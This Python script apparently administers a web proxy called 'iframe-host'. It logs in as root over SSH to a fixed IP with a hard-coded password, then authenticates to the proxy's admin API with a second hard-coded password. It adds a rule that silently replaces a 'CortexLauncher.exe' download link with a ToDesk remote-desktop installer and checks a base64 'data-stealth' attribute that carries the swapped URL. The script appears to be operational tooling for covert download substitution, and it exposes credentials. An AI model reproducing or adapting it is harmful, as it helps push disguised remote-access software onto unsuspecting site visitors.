#!/usr/bin/env python3
"""Verify data-stealth attribute rewriting."""
import paramiko, time, base64

HOST = "50.114.113.121"
PORT = 22
USER = "root"
PASS = "PaSdf5z8b3t2SaZdFdj2"

def run(ch, cmd, timeout=30):
    ch.exec_command(cmd)
    out, err = b"", b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if ch.recv_ready(): out += ch.recv(65536)
        if ch.recv_stderr_ready(): err += ch.recv_stderr(65536)
        if ch.exit_status_ready():
            while ch.recv_ready(): out += ch.recv(65536)
            while ch.recv_stderr_ready(): err += ch.recv_stderr(65536)
            break
        time.sleep(0.1)
    return out.decode("utf-8", "replace"), err.decode("utf-8", "replace")

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, PORT, USER, PASS, timeout=15, banner_timeout=15)
print(f"Connected to {HOST}")

# 1. First, add the replace rule via API
import json
payload = {
    "replace_rules": [{
        "pattern": "https://runcortex.xyz/files/CortexLauncher.exe",
        "replacement": "https://dl.todesk.com/irrigation/ToDesk_4.9.7.3.exe",
        "mode": "literal"
    }]
}

# Write payload to temp file and upload
with open("temp_config.json", "w") as f:
    json.dump(payload, f)

sftp = client.open_sftp()
sftp.put("temp_config.json", "/tmp/update_rules.json")
sftp.close()

# Update config via curl to admin API (need to login first)
ch = client.get_transport().open_session()
o, _ = run(ch, """
TOKEN=$(curl -s -X POST http://127.0.0.1:3030/admin/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Qv8sLm3pN7xT2kAa9Z4r"}' | grep -o '"token":"[^"]*' | cut -d'"' -f4)
echo "Token: $TOKEN"
curl -s -X PUT http://127.0.0.1:3030/admin/api/config \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d @/tmp/update_rules.json
""", 40)
print(f"[1] Updated replace_rules via API:\n{o}\n")

# 2. Extract data-stealth from proxied HTML
ch = client.get_transport().open_session()
o, _ = run(ch, r"curl -s http://127.0.0.1:3030/ | grep -o 'data-stealth=\"[^\"]*' | head -1")
b64 = o.strip().split('"')[1] if '"' in o else ""
print(f"[2] data-stealth base64: {b64}")
if b64:
    try:
        decoded = base64.b64decode(b64).decode('utf-8')
        print(f"    Decoded: {decoded}\n")
    except: print("    (decode failed)\n")

# 3. Check current config on server
ch = client.get_transport().open_session()
o, _ = run(ch, "cat /etc/iframe-host/config.production.json | grep -A5 replace_rules")
print(f"[3] Current config replace_rules:\n{o}")

client.close()
import os
os.remove("temp_config.json")
print("\nDone. Check if data-stealth now contains ToDesk URL.")
